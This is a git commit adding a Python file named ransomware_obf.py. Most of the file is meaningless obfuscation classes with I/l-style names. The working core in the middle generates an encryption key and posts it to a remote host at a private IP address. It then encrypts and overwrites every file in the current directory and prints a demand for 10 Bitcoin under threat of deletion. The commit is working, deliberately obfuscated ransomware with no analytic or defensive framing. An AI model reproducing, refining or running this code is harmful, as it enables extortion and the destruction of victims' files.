3f865ce86f0a7702de0807dc8caeea75f28b6646
HaykanushAsryan <haykanushasryan00gmail.com>
2024-05-11 11:45:59 +0400

    Obfuscated Version

---
+++ ransomware_obf.py
@@ -0,0 +1,258 @@
+import requests
+import os
+from cryptography.fernet import Fernet
+class IlllIllllIIII:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.IlIlIllIIlI()
+        IIlIlIlIIlIIl.IlllIllIIIlllI()
+        IIlIlIlIIlIIl.lllIlIlIII()
+        IIlIlIlIIlIIl.lIlIllIIIIlIIlIlll()
+        IIlIlIlIIlIIl.llllIIIIllIllIIIII()
+        IIlIlIlIIlIIl.IllIlIIlllIl()
+        IIlIlIlIIlIIl.llllIlIlIllIlI()
+        IIlIlIlIIlIIl.llllllllllIlIll()
+        IIlIlIlIIlIIl.lIllIlIlIllllI()
+        IIlIlIlIIlIIl.IlIlllII()
+    def IlIlIllIIlI(IIlIlIlIIlIIl, IlIlIIIIIIIIlllI, IlllIlIllIIIlII, llllIlIlIIIlIllllIll):
+        return IIlIlIlIIlIIl.lIlIllIIIIlIIlIlll()
+    def IlllIllIIIlllI(IIlIlIlIIlIIl, llIlIIllIIIlIllIIllI, lllIIllIIIlllllIIll, IIIlIIIll, llIllllIIIllI):
+        return IIlIlIlIIlIIl.llllllllllIlIll()
+    def lllIlIlIII(IIlIlIlIIlIIl, IIIlIllIlllll, lIlIllIllIlIlllIIlll, llIlIlIlllllIll, IlIlIlllllIlllIIlll, lllllIIIIIllll):
+        return IIlIlIlIIlIIl.lllIlIlIII()
+    def lIlIllIIIIlIIlIlll(IIlIlIlIIlIIl, IlIIIIlllIlllIlI, llIlIlIIIllIlII, lIlllllIIllIlll, IlIlIlIIIllllIII, llIlIIIlIIlllIllII, llIlllIl, llIlIllIlIllllllI):
+        return IIlIlIlIIlIIl.IllIlIIlllIl()
+    def llllIIIIllIllIIIII(IIlIlIlIIlIIl, IllIlIIIIIlI, lllIlIIl, IIlllllIllIIIllI, IIlllllllIlIlIlIIl, IIIIIlIlIl, lIIIIIllIIIlII):
+        return IIlIlIlIIlIIl.IlIlIllIIlI()
+    def IllIlIIlllIl(IIlIlIlIIlIIl, IlllIlIlI, lIlllIllll):
+        return IIlIlIlIIlIIl.llllIlIlIllIlI()
+    def llllIlIlIllIlI(IIlIlIlIIlIIl, lllllIIlllI, llIIlIIIlIlllIlI, lIIlIlIlIIll, lIIlIIlIIIll, IIIlIIlllIII):
+        return IIlIlIlIIlIIl.lllIlIlIII()
+    def llllllllllIlIll(IIlIlIlIIlIIl, lIIlllIlIIlIIllIIIII):
+        return IIlIlIlIIlIIl.lllIlIlIII()
+    def lIllIlIlIllllI(IIlIlIlIIlIIl, IIIlIIIllllIIllI, lIIIIlII, IIllllII, IIlllIllllllIlIl, lIIlIlllIIIIlll, IllIIIlIl):
+        return IIlIlIlIIlIIl.lllIlIlIII()
+    def IlIlllII(IIlIlIlIIlIIl, IIIlIIllIIl, lIlIIlIIlIIIllI, lllllllIlllIl, lIIlIIIlIIIlIllIIlIl, IIlllIIIIllIIlIIIIlI, IIIIIlllllIIIlllIl, IlIlIIIIlIlIlIIllIl):
+        return IIlIlIlIIlIIl.llllIlIlIllIlI()
+class lllIIIllIIII:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.lIIlIIlllI()
+        IIlIlIlIIlIIl.llIlIllllIIIllIlIl()
+        IIlIlIlIIlIIl.llIlIIllllIIIllIl()
+        IIlIlIlIIlIIl.IlIlllIIIlI()
+        IIlIlIlIIlIIl.IIIIIIlI()
+        IIlIlIlIIlIIl.IIIIllII()
+        IIlIlIlIIlIIl.lIIlIIlIlllIIlII()
+        IIlIlIlIIlIIl.llIIIlllIlll()
+        IIlIlIlIIlIIl.IIIIIllIlIIIllIlI()
+        IIlIlIlIIlIIl.lIllIlII()
+        IIlIlIlIIlIIl.IllIllIII()
+        IIlIlIlIIlIIl.IIllIlIllllIllIIIl()
+        IIlIlIlIIlIIl.lIIIlIIIIII()
+    def lIIlIIlllI(IIlIlIlIIlIIl, lIIIIIlIlIII, lllIlIIll, llIlIIllIIlII, IlIlIlIIIllIl, lIIlllllIIlIllIIII, IlIllIII, lllIlIIllllIIlllIlI):
+        return IIlIlIlIIlIIl.IIIIIllIlIIIllIlI()
+    def llIlIllllIIIllIlIl(IIlIlIlIIlIIl, IllIIlIIlIIlIllIIlII, IllIIlIIlIIIllIIl, IlllIIlIIlIIlll, IllIllIIIIII, IlllIIlllllllllI, llIIIIlIIIllIl):
+        return IIlIlIlIIlIIl.IlIlllIIIlI()
+    def llIlIIllllIIIllIl(IIlIlIlIIlIIl, IlllIllIlIlIl, IllIllIlI):
+        return IIlIlIlIIlIIl.IIIIIIlI()
+    def IlIlllIIIlI(IIlIlIlIIlIIl, lllIlIIlIllIllIllI, IIIllIIIIIlIllll, IIlIIlIIlIlllllIllII, IlIlIllIlllIllIllll, lIlIIlIlIlllIl):
+        return IIlIlIlIIlIIl.lIIlIIlIlllIIlII()
+    def IIIIIIlI(IIlIlIlIIlIIl, llIIllIllllIllIlI):
+        return IIlIlIlIIlIIl.IllIllIII()
+    def IIIIllII(IIlIlIlIIlIIl, IlIllllllIIIIIlII, lllIIlIIlIl, lIIlIIlIIlIlIII, lIIIllIIlIIl, IIlIIlIllIIIlIlIII):
+        return IIlIlIlIIlIIl.IIllIlIllllIllIIIl()
+    def lIIlIIlIlllIIlII(IIlIlIlIIlIIl, IllIIllllIlIll, IlIlIlIl):
+        return IIlIlIlIIlIIl.IlIlllIIIlI()
+    def llIIIlllIlll(IIlIlIlIIlIIl, IIIIlIlIIIlIIII, lIIIllllllllIlll, IIIIlIlIIIlIlIlIIIl, lIlIIIlIlIIlIllIIl, llllIlIlIIlllIIIII):
+        return IIlIlIlIIlIIl.lIIlIIlIlllIIlII()
+    def IIIIIllIlIIIllIlI(IIlIlIlIIlIIl, IlIIlIIllIlIIIllll, lIllIIIlIIIIllllIIIl, IIIIllIlIIlI, IIlIIIlIIlllll, llllIllIIl, lIIIlIllIIIIl, IIlIllIlIIIlIIllllII):
+        return IIlIlIlIIlIIl.llIIIlllIlll()
+    def lIllIlII(IIlIlIlIIlIIl, lIlllIIlIlIllllI, llIIIlIllIlIIlIIIll, lIlllllIIllII, lIIlIIIlllIlll):
+        return IIlIlIlIIlIIl.IIIIllII()
+    def IllIllIII(IIlIlIlIIlIIl, IIIlIllIIlIlll, lIIllIIIlIll, lIIIlIIlllllIllllll, IIllIlIIlllII, IIIIllIllIl, llIIIllIIlIlIlIll, lllIIIIIIlI):
+        return IIlIlIlIIlIIl.IllIllIII()
+    def IIllIlIllllIllIIIl(IIlIlIlIIlIIl, IIlIlIIIl, IlIllIIIlIIIIllIl, IllIlllIIIllIIIIIl):
+        return IIlIlIlIIlIIl.IIIIllII()
+    def lIIIlIIIIII(IIlIlIlIIlIIl, llllIIllIIIIl, lIlIIlIIlIIIIIIll, IIIllIIllIlIIIlIllI, lIlIIlIlII, lIllIIIIllIlllIIlI, lIIIIllIlllIllI, IIIIIlIIIIIlIll):
+        return IIlIlIlIIlIIl.llIlIIllllIIIllIl()
+class lIlIlllIIIII:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.llIlllIIllI()
+        IIlIlIlIIlIIl.IlIIIllIIIIlllIIlll()
+        IIlIlIlIIlIIl.llIIlIlllIlIIIII()
+        IIlIlIlIIlIIl.lIlIIIIIllIllII()
+        IIlIlIlIIlIIl.lIlIIIIlllllllIlllI()
+        IIlIlIlIIlIIl.IlIllIIIllIIIIll()
+        IIlIlIlIIlIIl.IlIlIIIllIlI()
+        IIlIlIlIIlIIl.IIlIlIIllIIlIII()
+        IIlIlIlIIlIIl.IIllIllllIIllI()
+        IIlIlIlIIlIIl.IIllIIllIlIII()
+        IIlIlIlIIlIIl.IllIIlIlllIIIlII()
+        IIlIlIlIIlIIl.IllIllIlIllII()
+        IIlIlIlIIlIIl.lllIIIIlIl()
+    def llIlllIIllI(IIlIlIlIIlIIl, lIIIIlllllIllIIIIIll, lllIIIllIlI, IlIIIIlIIIIl, IlIIlIIlIllIl, lIIlllIIIl, IlIIlIlIlll):
+        return IIlIlIlIIlIIl.IllIllIlIllII()
+    def IlIIIllIIIIlllIIlll(IIlIlIlIIlIIl, llIlIlIllII):
+        return IIlIlIlIIlIIl.IllIIlIlllIIIlII()
+    def llIIlIlllIlIIIII(IIlIlIlIIlIIl, lIlIlIlIIlI, lIIlIIllllll, IlllIIIlllllIIIlIIl, IllIIIllIlll, lIlIIllIIIlII, IIIIlIIIIlIl, IIIIlIlIllllIIIlIIlI):
+        return IIlIlIlIIlIIl.IIlIlIIllIIlIII()
+    def lIlIIIIIllIllII(IIlIlIlIIlIIl, llIlIIIIIII, llIllllIlIIlIIlllI, llllIlIIlllllIlI):
+        return IIlIlIlIIlIIl.lllIIIIlIl()
+    def lIlIIIIlllllllIlllI(IIlIlIlIIlIIl, lIlIIIIIlIIIlllll, IIllIlIllIIIIlI, IIlIIllIIIIIll, IlIIlIIlIIlIl):
+        return IIlIlIlIIlIIl.IlIlIIIllIlI()
+    def IlIllIIIllIIIIll(IIlIlIlIIlIIl, IIIIllllIIIll, IllllllIlIIIIII):
+        return IIlIlIlIIlIIl.IIllIllllIIllI()
+    def IlIlIIIllIlI(IIlIlIlIIlIIl, IIIlIllllIlIII, lIIIIIIIIII, IlIllllllllllIl, IlIlIllllIlllll):
+        return IIlIlIlIIlIIl.IIllIllllIIllI()
+    def IIlIlIIllIIlIII(IIlIlIlIIlIIl, IlIIlIIIIIIlllllIIlI, IlIIIllIlIlIIIlIllIl, lIlIlIlIll, IlIllIIIIIIlII, IIIIIlIllIllII, IlllIlIIIlllII):
+        return IIlIlIlIIlIIl.IlIlIIIllIlI()
+    def IIllIllllIIllI(IIlIlIlIIlIIl, lIlIllll, IIllIlllllIIlIII, llIllIlIIIIlIIII, llIlllIIlIlllIlIIIl, lllIllIllIllIl, lllIIIlllIIlI):
+        return IIlIlIlIIlIIl.IlIllIIIllIIIIll()
+    def IIllIIllIlIII(IIlIlIlIIlIIl, llllIlII, lllIllIlIl, IlIlIIIIIllIllIII, lIIllIllIIlIlIIII, IIIllIlIIIlll):
+        return IIlIlIlIIlIIl.IlIIIllIIIIlllIIlll()
+    def IllIIlIlllIIIlII(IIlIlIlIIlIIl, IllIlIlIlIllIlIII, llIIlllIlIlIlIlIIlI, IIIlIlII, llllIIIIIlIIIIIlIl, IlIllIlIll, llllIIIlllllIIlIll):
+        return IIlIlIlIIlIIl.IIllIIllIlIII()
+    def IllIllIlIllII(IIlIlIlIIlIIl, lIlIlIIIlI, lllIIlllll):
+        return IIlIlIlIIlIIl.lIlIIIIIllIllII()
+    def lllIIIIlIl(IIlIlIlIIlIIl, lllIlIIIllllI, llIlIlllllIIIIIlI, lIlllIlIlIIII):
+        return IIlIlIlIIlIIl.IIlIlIIllIIlIII()
+class IIIIllIIIlII:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.IllIlIIIIlII()
+        IIlIlIlIIlIIl.IIIIIIIIllIll()
+        IIlIlIlIIlIIl.IlllIIIIllIllIlIIll()
+        IIlIlIlIIlIIl.llIIIIlllIIIllIIl()
+        IIlIlIlIIlIIl.lIllIIIlIlIlIIlI()
+        IIlIlIlIIlIIl.IIllIIIllIlIllll()
+        IIlIlIlIIlIIl.IIllIlIlIlIIIIIl()
+        IIlIlIlIIlIIl.IIlIIIIlllI()
+        IIlIlIlIIlIIl.lIllllll()
+        IIlIlIlIIlIIl.lllllIlIIIlllIIII()
+        IIlIlIlIIlIIl.IIIllIIlllll()
+        IIlIlIlIIlIIl.IIlIlIIIIIIlIlIlllll()
+    def IllIlIIIIlII(IIlIlIlIIlIIl, lIIlIllIlIlllIlII, IlllIllIIII, llIIIIlIIIIIIIl, lllIllIlll, llllIIIIIll):
+        return IIlIlIlIIlIIl.IIlIIIIlllI()
+    def IIIIIIIIllIll(IIlIlIlIIlIIl, lllIIlIII):
+        return IIlIlIlIIlIIl.IIllIIIllIlIllll()
+    def IlllIIIIllIllIlIIll(IIlIlIlIIlIIl, lIlIlIlIllIIIIIIl):
+        return IIlIlIlIIlIIl.IIllIIIllIlIllll()
+    def llIIIIlllIIIllIIl(IIlIlIlIIlIIl, IlIIIIllIIllllIIIIll, IIlIIIllIllIlIIIl, IlIIIlIIIIIIIIIlIII, IlllIIlIIlI, IIIIIIIllIIlIIIIlIl, IIIIIllIlIllIlIIllIl):
+        return IIlIlIlIIlIIl.IlllIIIIllIllIlIIll()
+    def lIllIIIlIlIlIIlI(IIlIlIlIIlIIl, IIlIllIlllIl, IIlllllIIlI, lIIllllIlIlIIIl, IIIIlllIIIIlIlII, llIIllIllIIllllllI):
+        return IIlIlIlIIlIIl.lIllIIIlIlIlIIlI()
+    def IIllIIIllIlIllll(IIlIlIlIIlIIl, lllllllIIIIllIIlII, lIIlIIIIlIlIIlII, lIIlIlllIIlI, IlllIllIIllIlIlI):
+        return IIlIlIlIIlIIl.IIlIlIIIIIIlIlIlllll()
+    def IIllIlIlIlIIIIIl(IIlIlIlIIlIIl, IIIIIIIlIIllIlIlIlI, lllllIlIII, IIllllllllIII, lllIlllllII, lIIlIIIllIIlIlIll, IIIlIIlIl, IIlIIllIIll):
+        return IIlIlIlIIlIIl.IIIllIIlllll()
+    def IIlIIIIlllI(IIlIlIlIIlIIl, lIlIlIllIII, IIIlIIIIIIIlIIIII, IllIllllIIlI, IIIlllIllIIlIl):
+        return IIlIlIlIIlIIl.IllIlIIIIlII()
+    def lIllllll(IIlIlIlIIlIIl, IIIIIlllIlIlIllIll):
+        return IIlIlIlIIlIIl.IllIlIIIIlII()
+    def lllllIlIIIlllIIII(IIlIlIlIIlIIl, lllllIIIIIII, IlllIlIIIlIlIll, llllIIIllIlIlIIIllll, lIlllIlllllIlIlll, lllIllIIl, IIlllIlIlllIIIllll):
+        return IIlIlIlIIlIIl.IIlIIIIlllI()
+    def IIIllIIlllll(IIlIlIlIIlIIl, llIlIIlIlIlllIllllI, lIIlIllIIIlIlIllIII, llIIlllIIllI):
+        return IIlIlIlIIlIIl.IllIlIIIIlII()
+    def IIlIlIIIIIIlIlIlllll(IIlIlIlIIlIIl, IIlIlIIllIlI, llIIIlIlIllIlIIIl, lIIlllIIIlllllII, llIIIIlIIllIIl):
+        return IIlIlIlIIlIIl.llIIIIlllIIIllIIl()
+def lllIIlIlIIIllIIlIlII(IIlllIIIIl):
+    IIlIIIIIlIlIIlllIIl = 'http://192.168.18.181:12340/send-key'
+    IllllIIlIIIlIIll = requests.post(IIlIIIIIlIlIIlllIIl, data={'key': IIlllIIIIl})
+IIlllIIIIl = Fernet.generate_key()
+lllIIlIlIIIllIIlIlII(IIlllIIIIl)
+IlllIIlIlIIIl = []
+for IlIIllllllI in os.listdir():
+    if IlIIllllllI == "decrypt.py":
+        continue
+    if os.path.isfile(IlIIllllllI):
+        IlllIIlIlIIIl.append(IlIIllllllI)
+for IlIIllllllI in IlllIIlIlIIIl:
+    with open(IlIIllllllI, "rb") as IIlllIlI:
+        IlIIIIlIlIIlIlIIIII = IIlllIlI.read()
+        lIlllIIIll = Fernet(IIlllIIIIl).encrypt(IlIIIIlIlIIlIlIIIII)
+    with open(IlIIllllllI, "wb") as IIlllIlI:
+        IIlllIlI.write(lIlllIIIll)
+print("All your files have been encrypted!\nSend me 10 Bitcoin or I'll delete them in 24 hours!!!")
+print("This is the wallet (or link) **********.")
+class IlIIIIllIlII:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.IIIIlIlIIlIIlI()
+        IIlIlIlIIlIIl.IlIllIIIlIIlIlI()
+        IIlIlIlIIlIIl.llIlIIllllIllIllII()
+        IIlIlIlIIlIIl.IIlIIIlllII()
+        IIlIlIlIIlIIl.IIIIIIlIllIIlIIl()
+        IIlIlIlIIlIIl.lllIIIlIIlIllIl()
+        IIlIlIlIIlIIl.lIllIllIIllIll()
+        IIlIlIlIIlIIl.lllIlIIlllIIl()
+        IIlIlIlIIlIIl.IIlIllIl()
+    def IIIIlIlIIlIIlI(IIlIlIlIIlIIl, IIlllIIIlllIlll, IlIIlIIIIllIIl, IllIIIIIlIlI):
+        return IIlIlIlIIlIIl.IIlIIIlllII()
+    def IlIllIIIlIIlIlI(IIlIlIlIIlIIl, IlIlIlIIIIllIlIlllll, lllIIIllllllllI, IIlIIlIIIIII, IlIlIlIIlllllIIlIlII, IIlIIIlllIlIllIII, lIllIIlIlIIIlllll, lIlIIIll):
+        return IIlIlIlIIlIIl.IIlIIIlllII()
+    def llIlIIllllIllIllII(IIlIlIlIIlIIl, lllllIlIIIIIll, IIlIIllIIIII):
+        return IIlIlIlIIlIIl.lIllIllIIllIll()
+    def IIlIIIlllII(IIlIlIlIIlIIl, IllIllII, IIIlIllIlIIllllI, llIlIIIllll, lIIIIIIIIlIlIIllIl, lIIlIlII):
+        return IIlIlIlIIlIIl.IIIIlIlIIlIIlI()
+    def IIIIIIlIllIIlIIl(IIlIlIlIIlIIl, IIlIIlllIlIllI, IlllIllIllllIIIIIlI, lIIlIlIIlllllI, IlIlIIlllIlllIl, lllIIllIlIIllIl):
+        return IIlIlIlIIlIIl.IIlIIIlllII()
+    def lllIIIlIIlIllIl(IIlIlIlIIlIIl, IllIlIllIIlIIIlIIl, lIlIlIlI, IllIIlIlI, llIIIlIIIllIIlI, IlIlllIIlIlIlIllII):
+        return IIlIlIlIIlIIl.IIIIlIlIIlIIlI()
+    def lIllIllIIllIll(IIlIlIlIIlIIl, llIllIIlll, IllIIIIlIlII, IllIlIIII, lIlIllIIIlIIIII, IlIlIlIIIlIIlIlllI, IllIlIlIll, lIlllllIIlIIlIIII):
+        return IIlIlIlIIlIIl.IlIllIIIlIIlIlI()
+    def lllIlIIlllIIl(IIlIlIlIIlIIl, llllIIIIlIl):
+        return IIlIlIlIIlIIl.IlIllIIIlIIlIlI()
+    def IIlIllIl(IIlIlIlIIlIIl, IllIIIIlIIlll, IlIIIlIIIllIIllII, lIllIllIlIlIIllll, IIlIIlIlllIlIlIl, IlllIIIIllIllII, IIIlIIlI):
+        return IIlIlIlIIlIIl.lllIlIIlllIIl()
+class lIllIIIIIlllI:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.lllIIIIIIlIlllIlI()
+        IIlIlIlIIlIIl.IlIIllIlIlIIlllIlIII()
+        IIlIlIlIIlIIl.llllIlllIIIlIlI()
+        IIlIlIlIIlIIl.lIllllllIIllI()
+        IIlIlIlIIlIIl.IlllIlIlllllII()
+        IIlIlIlIIlIIl.IIIIlIIlllIllIllIIl()
+        IIlIlIlIIlIIl.lIllIlIlIIIIIIlIIl()
+        IIlIlIlIIlIIl.lIIIllllIlllIIl()
+        IIlIlIlIIlIIl.IlllIlIIllllIll()
+        IIlIlIlIIlIIl.IIIlllllIIlllIlIIl()
+        IIlIlIlIIlIIl.IllIlIIIlllI()
+        IIlIlIlIIlIIl.lllIllllIIlllIIlIIl()
+    def lllIIIIIIlIlllIlI(IIlIlIlIIlIIl, lIIlIIlIIlllIIlllI, lIIIllllIlIIIIIl, IlllIIIIlII, IIIllllIlIIlllllI, lllIIllIllIlIlllI, lIIlIIIIIIlIIlIII):
+        return IIlIlIlIIlIIl.lIllIlIlIIIIIIlIIl()
+    def IlIIllIlIlIIlllIlIII(IIlIlIlIIlIIl, lllIlllIlIIllIlI):
+        return IIlIlIlIIlIIl.lllIllllIIlllIIlIIl()
+    def llllIlllIIIlIlI(IIlIlIlIIlIIl, lIllIlllIIIlllIIl):
+        return IIlIlIlIIlIIl.lllIllllIIlllIIlIIl()
+    def lIllllllIIllI(IIlIlIlIIlIIl, llIlIlIlI):
+        return IIlIlIlIIlIIl.lIIIllllIlllIIl()
+    def IlllIlIlllllII(IIlIlIlIIlIIl, IlIIIllllIII):
+        return IIlIlIlIIlIIl.IlllIlIIllllIll()
+    def IIIIlIIlllIllIllIIl(IIlIlIlIIlIIl, lIlIllII, llIIIIIlI, lllllIllI):
+        return IIlIlIlIIlIIl.IllIlIIIlllI()
+    def lIllIlIlIIIIIIlIIl(IIlIlIlIIlIIl, llIlIIlllIllIIIlIIlI, lIllIIlllIlllIIIl, IlllIIIIllIllI, lllIllllIIlll):
+        return IIlIlIlIIlIIl.IIIlllllIIlllIlIIl()
+    def lIIIllllIlllIIl(IIlIlIlIIlIIl, lIIlIllIIlIIlIIll, IlIlIIllllIll):
+        return IIlIlIlIIlIIl.IlllIlIlllllII()
+    def IlllIlIIllllIll(IIlIlIlIIlIIl, IIIlIIlIlIlIIIII, IlIllIllI, IIlIllIlIIlIllllIlII):
+        return IIlIlIlIIlIIl.IIIlllllIIlllIlIIl()
+    def IIIlllllIIlllIlIIl(IIlIlIlIIlIIl, IIlIIIlI):
+        return IIlIlIlIIlIIl.IllIlIIIlllI()
+    def IllIlIIIlllI(IIlIlIlIIlIIl, lIllllIlIlIlllIIlllI, IIllIlIIIIIIlllIlll, IlIllIIlll, IIlllIIIlIlIIlIIllIl):
+        return IIlIlIlIIlIIl.lllIllllIIlllIIlIIl()
+    def lllIllllIIlllIIlIIl(IIlIlIlIIlIIl, lIlIIlllIIlIllIIIIll, llIllIlI, IIlIllllIIlIlllIIIl, IIIllllllIl):
+        return IIlIlIlIIlIIl.lIllIlIlIIIIIIlIIl()
+class IlllllIlIlIIlllIIIll:
+    def __init__(IIlIlIlIIlIIl):
+        IIlIlIlIIlIIl.IIlllIIlIllI()
+        IIlIlIlIIlIIl.IllllIII()
+        IIlIlIlIIlIIl.IIllIIIIIlIll()
+        IIlIlIlIIlIIl.lIllIllIlIllIIIlIlll()
+        IIlIlIlIIlIIl.IIIllIllIIIIllIIlIll()
+    def IIlllIIlIllI(IIlIlIlIIlIIl, IIllIIlllIlIllIlIl, IlllllllllIl):
+        return IIlIlIlIIlIIl.lIllIllIlIllIIIlIlll()
+    def IllllIII(IIlIlIlIIlIIl, IIIllIIIlI, lllIIIlllIIIlII, IIIIlIII, IllIIlIIIll, lllIlllIIlllllIIIllI, IllIIlIlllIIlIIIIl):
+        return IIlIlIlIIlIIl.IllllIII()
+    def IIllIIIIIlIll(IIlIlIlIIlIIl, lIIlIIlll, lIlIllIlllllIlIII, IlllIIIIllIIIlIII, lllIlIIIIllI, llIIIlIIlIllIlIIIlI):
+        return IIlIlIlIIlIIl.IIIllIllIIIIllIIlIll()
+    def lIllIllIlIllIIIlIlll(IIlIlIlIIlIIl, lIlllllII, lIlIlIlII, lIlIlIlIlllIllllIlII, lIIlIIlIIIllIIlIIIl, IllIlIlIIlIIIlIl, IIlIlllIlIlIlllIIll, IlllllIIlIII):
+        return IIlIlIlIIlIIl.IllllIII()
+    def IIIllIllIIIIllIIlIll(IIlIlIlIIlIIl, IlIIIIlIIIlIIIlllI, IllllIIlIIIllIIllII, lIIIIIlIII, IlIlllIIllIIlIII, IllIIlIIIIllIll):
+        return IIlIlIlIIlIIl.IllllIII()
